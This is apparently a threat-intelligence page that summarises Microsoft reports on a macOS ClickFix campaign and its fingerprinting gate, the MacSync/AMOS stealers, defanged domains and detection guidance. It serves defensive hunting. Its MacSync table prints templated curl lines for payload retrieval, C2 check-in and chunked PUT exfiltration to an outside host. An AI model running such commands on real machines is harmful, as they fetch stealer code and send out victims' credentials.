# macOS ClickFix fingerprinting-gate campaign

## Summary
Microsoft Threat Intelligence documented a macOS ClickFix operation that moved from openly serving malicious Terminal commands to revealing them only after a server-side browser-fingerprinting gate judged a visitor to be a likely genuine Mac user. The campaign uses more than **250 confirmed front-end domains**, often generated from dictionary words and the token `file`, and ultimately delivers the MacSync or Atomic Stealer (AMOS) information stealers.

The gate is the durable defender finding. The same URL can return a ClickFix lure, a blank or parked-looking page, or an unrelated browser-extension, VPN, or business decoy depending on the request. A benign response from a crawler or sandbox therefore does not clear the infrastructure.

## Tags
- ops
- operations
- ClickFix
- macOS
- Atomic Stealer
- AMOS
- infostealer
- social engineering
- user execution
- browser fingerprinting
- anti-analysis
- TDS
- cloaking
- MacSync
- chunked exfiltration
- credential theft
- cryptocurrency wallet theft
- Microsoft Threat Intelligence

## Why this matters
- Server-side qualification removes the malicious command from the initial response and reduces visibility to static scanners, crawlers, sandboxes, and researchers.
- The gate combines several ordinary browser signals. Detection should correlate its form-submission behavior, field names, domain-generation pattern, and downstream process activity rather than treat any one fingerprinting feature as malicious.
- ClickFix starts with a user-pasted Terminal command instead of a downloaded application bundle. This can avoid quarantine, code-signing, and notarization checks normally applied to downloaded macOS applications.
- The campaign's disposable front ends exceed 250 domains. Shared gate behavior and staging paths are more durable hunting pivots than a blocklist alone.
- MacSync and AMOS target high-value local material, including browser credentials, keychain data, SSH keys, authentication stores, cryptocurrency wallets, and other sensitive files.

## Delivery and infection chain
1. A victim reaches a look-alike domain, commonly following a `file<word><word>`-style naming pattern.
2. The initial response supplies a roughly 2.5 KB JavaScript profiling routine rather than the ClickFix command.
3. The script collects browser, display, hardware, page-context, and runtime attributes and silently submits the fingerprint to the same server.
4. The server returns blank, parked, or decoy content to requests that appear automated, virtualized, geographically unexpected, or inconsistent with the selected browser and platform.
5. A qualifying Mac visitor receives a counterfeit **Download for macOS** page with GitHub-themed branding, a forged **Verified Publisher** badge, and a button that copies an obfuscated `curl` one-liner. Microsoft states that the branding is spoofed and does not indicate a GitHub compromise.
6. After the user pastes and runs the command in Terminal, it retrieves a remote script from a `/curl/<id>` path. Multiple script stages then download and launch MacSync or AMOS.
7. The infostealer collects credentials, browser and wallet data, authentication stores, keys, and sensitive files for exfiltration.

## Fingerprinting and cloaking
The client builds a fingerprint from six browser objects: `navigator`, `screen`, `window`, `document`, `location`, and `console`. Reported attributes and checks include:

- claimed platform such as `MacIntel`, user agent, browser vendor, language, and plugins;
- screen and window dimensions, color depth, and pixel ratio;
- page title, referrer, character set, URL, and host;
- WebGL-derived GPU information used to distinguish likely Apple hardware from virtualized, emulated, software-rendered, or sandboxed environments;
- timezone offset, iframe execution, and touch-input support;
- a `toString()` counter that can change when an open developer console or logging tool serializes a temporary function;
- a `canPlayType("video/mp4")` tripwire that sets a `proto:true` signal when JavaScript-based codec spoofing reaches a hooked `Array.prototype.includes` path; and
- a fingerprint object carrying `mode: "php"` before same-origin submission.

Microsoft describes this as a traffic distribution system: the server selects what to deliver after evaluating the submitted profile. In testing, Windows-presenting requests received decoys such as a fake Urban VPN Proxy page or an unrelated logistics-company page, simple crawlers received empty or parked-looking content, and qualifying Mac requests received the lure.

## Domain and content pivots
Microsoft confirmed more than 250 campaign front ends. Many combine dictionary words with `file`, but some put the token in the middle or at the end and some omit it. Treat the naming convention as a clustering lead, not a standalone verdict.

Published examples:

| Domain | Reported role |
|---|---|
| `applefilevault[.]com` | ClickFix front end |
| `apricotfilepoint[.]com` | ClickFix front end; qualifying lure and non-qualifying decoy observed |
| `bananafastfile[.]com` | ClickFix front end |
| `cloudfilebridge[.]com` | ClickFix front end |
| `filecedarwallet[.]online` | ClickFix front end |
| `filecopperbasket[.]sbs` | ClickFix front end |
| `filecrimsonsignal[.]online` | ClickFix front end |
| `filemarblegarden[.]sbs` | ClickFix front end |
| `fileoceanhammer[.]sbs` | ClickFix front end |
| `filerubyfolder[.]sbs` | ClickFix front end |
| `filevelvettractor[.]sbs` | ClickFix front end |
| `lemonfilewave[.]com` | ClickFix front end |
| `limefilescope[.]com` | ClickFix front end |
| `mangocloudfile[.]com` | ClickFix front end |
| `orangesmartfile[.]com` | ClickFix front end |
| `syncdatavault[.]com` | ClickFix front end |
| `cloudsendhub[.]com` | ClickFix front end |

Additional content and traffic pivots:

- a minimal page that collects browser attributes and self-submits a hidden fingerprint to the same origin;
- a fingerprint field or object containing `mode: "php"`;
- dictionary-style `file<word><word>` domains combined with the gate behavior;
- counterfeit **Download for macOS** and **Verified Publisher** text;
- `/curl/<hex-id>` or similar staging paths; and
- different content from the same domain according to browser, hardware, runtime, or request context.

## Endpoint detection and response
- Alert when a browser visit is followed by Terminal or shell execution of `curl`, `base64`, `gunzip`, `zsh`, or `osascript`.
- Hunt sequences such as `curl` piped to `zsh`, `base64 -d`, and `xattr -c` followed by `chmod +x` and execution.
- Review `curl` downloads from newly registered or low-reputation domains, especially `/curl/<id>` paths and encoded or compressed responses.
- Detect unauthorized access to Keychain material, browser credential databases, SSH keys, authentication stores, and cryptocurrency-wallet files.
- Alert on sensitive-file archive creation followed by HTTP POST exfiltration.
- Correlate proxy or DNS sightings with browser history and endpoint process lineage; do not close an alert because a later fetch returned a benign decoy.
- Where infrastructure validation supports it, block shared staging or back-end hosts in addition to disposable front-end domains.
- Reinforce that legitimate downloads, CAPTCHAs, publisher verification, and software fixes do not require copying a website-provided command into Terminal.

Microsoft lists Defender behavior detections including `Behavior:MacOS/SuspAmosExecution`, `Behavior:MacOS/SuspOsascriptExec`, `Behavior:MacOS/SuspDownloadFileExec`, `Behavior:MacOS/SuspInfoExfil`, `Behavior:MacOS/SuspKeyChainCopy.AB`, `Behavior:MacOS/SuspInfostealExec`, `Behavior:MacOS/SuspCredCopy`, and `Behavior:MacOS/SuspPassSteal`.

Apple added a Terminal paste warning in macOS 26.4 and later for commands assessed as potentially malicious. Treat the warning as friction, not a substitute for web, network, and endpoint controls.

## MacSync behavioral pivots and rotating infrastructure
On August 18, 2026, Microsoft Defender Experts published a follow-up focused on the **MacSync Stealer** payload of the same ClickFix chain. RST Cloud had first identified the threat through a limited domain set and documented rapid C2 replacement after public disclosure; Microsoft's team correlated recurring endpoints and network behaviors instead and connected **more than 30 domains**, using the domain count as an outcome of the behavioral methodology rather than the primary finding. The linked infrastructure supported more than C2 communication — it extended into active collection, staging, and chunked exfiltration.

The strongest pivots combined network request shape with endpoint execution context:

| Phase | Representative behavioral pivot | Why it matters |
|---|---|---|
| Payload retrieval | `curl -kfsSL http://[domain]/curl/[token]` | Identifies the initial payload-retrieval pattern without depending on a single domain. |
| C2 check-in | `curl -k -s --max-time 30 -H "User-Agent: Mozilla/5.0 (Macintosh…)" -H "api-key: ***" http://[domain]/dynamic?txd=[token]` | Combines endpoint command-line context with recurring request shape, headers, and URI paths. |
| Chunked exfiltration | `curl -k -s -X PUT --data-binary @- -H "api-key: ***" http://[domain]/gate?buildtxd=[token]&upload_id=[id]&chunk_index=[n]&total_chunks=[n]` | Shows active data exfiltration and provides durable upload parameters for hunting across domains. |

Additional durable traits:

- recurring URI paths `/curl/`, `/dynamic?txd=`, and `/gate?buildtxd=`;
- `curl` command lines using `-k`, `-s`, `--max-time`, and `--data-binary`;
- macOS User-Agent strings on otherwise unusual outbound requests;
- a custom `api-key` request header;
- HTTP PUT uploads carrying `upload_id`, `chunk_index`, and `total_chunks` parameters;
- staged, compressed archives under temporary paths, split into chunks before upload;
- collection of macOS Keychain material, browser data, locally stored credentials, cloud and SSH credentials, and sensitive files from common user directories.

RST Cloud's URI-pattern pivots surfaced eleven additional candidate domains, and a static `api-key` value was shared across four confirmed C2 domains while the build token rotated per deployment. Domains were treated as related only when multiple behavioral traits aligned across process, command-line, and network telemetry, reducing reliance on any single domain indicator.

Detection corollary: alert on chunked HTTP PUT exfiltration from `curl` with `upload_id` / `chunk_index` / `total_chunks` query parameters on macOS, and correlate the `/gate?buildtxd=` or `/dynamic?txd=` request shape with shell ancestry. Rotating domains weaken static blocklists and retrospective IOC matching, but the request shape and process behaviors are more durable hunting surfaces.

## Assessment limits
- Microsoft describes a campaign cluster and malware-delivery method but does not name or attribute the operator.
- More than 250 front-end domains were confirmed during Microsoft's tracking window, and more than 30 domains were behaviorally linked to the MacSync Stealer activity; the complete population, victim count, and successful-infection count are not public in the cited reports.
- Browser fingerprinting, WebGL checks, and traffic-distribution systems have legitimate uses. Confidence comes from correlated gate, infrastructure, lure, staging, and endpoint behavior.
- The listed domains are historical detection pivots. DNS, ownership, content, and server behavior can change.
- MacSync and AMOS are alternative reported outcomes of the chain; a front-end-domain sighting alone does not establish which payload, if any, executed.

## Related pages
- [ClickFix CPaaS API-driven payload delivery](clickfix-cpaas-api-driven-payload-delivery.md)
- [OX Security: ClickFix phishing pages hidden in 24 npm packages, using registry mirrors as payload storage](ox-clickfix-phishing-npm-mirror-payload-storage.md)
- [TELEPUZ ClickFix / VIDAR campaign](telepuz-clickfix-vidar-campaign.md)
- [CrashStealer macOS notarized-dropper campaign](crashstealer-macos-notarized-dropper.md)
- [XCSSET v40 Xcode supply-chain campaign](xcsset-v40-xcode-supply-chain-campaign.md)

## Source
- Microsoft Security Blog: [From open lures to cloaked gates: How a macOS ClickFix campaign learned to hide](https://www.microsoft.com/en-us/security/blog/2026/08/05/macos-clickfix-campaign-learned-hide/) — August 5, 2026
- Microsoft Security Blog (Defender Experts and Microsoft Security Research): [Hunting MacSync Stealer infrastructure through behavioral pivots](https://www.microsoft.com/en-us/security/blog/2026/08/18/hunting-macsync-stealer-infrastructure-through-behavioral-pivots/) — August 18, 2026
